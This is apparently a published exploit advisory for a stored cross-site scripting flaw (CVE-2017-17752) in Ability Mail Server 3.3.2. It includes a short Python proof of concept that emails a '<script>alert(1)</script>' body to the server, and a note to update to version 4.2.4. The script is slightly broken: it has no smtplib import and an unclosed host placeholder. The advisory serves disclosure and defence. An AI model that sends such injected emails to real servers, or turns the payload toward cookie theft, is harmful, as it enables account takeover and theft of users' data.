@@ -1,0 +1,40 @@
+# Exploit Title: Ability Mail Server 3.3.2 Persistent Cross Site Scripting (XSS)
+# CVE: CVE-2017-17752
+# Date: 19-12-2017
+# Software Link: http://download.codecrafters.com/ams3.exe 
+# Exploit Author: Aloyce J. Makalanga
+# Contact: https://twitter.com/aloycemjr
+# Vendor Homepage: http://www.codecrafters.com 
+# Category: webapps
+# Attack Type: Remote
+# Impact: Data/Cookie theft 
+
+ 
+1. Description
+
+
+   Ability Mail Server 3.3.2 has Persistent Cross Site Scripting (XSS) via the body of an e-mail message, with JavaScript code executed on the Read Mail screen (aka the /_readmail URI). To exploit the vulnerability, the victim must open an email with malicious Javascript inserted into the body of the email.
+
+
+   
+2. Proof of Concept
+
+ 
+
+#!/usr/bin/env python 
+email_addr = 'hacker@evil.local'
+email = 'From: %s\n' % email_addr
+email += 'To: %s\n' % email_addr
+email += 'Subject: XSS\n'
+email += 'Content-type: text/html\n\n'
+email +='<script>alert(1)</script>'
+s = smtplib.SMTP('<Attacker IP address', 25)
+s.login(email_addr, "password")
+s.sendmail(email_addr, email_addr, email)
+s.quit()
+
+3. Solution:
+
+   
+Update to version 4.2.4
+http://download.codecrafters.com/ams.exe
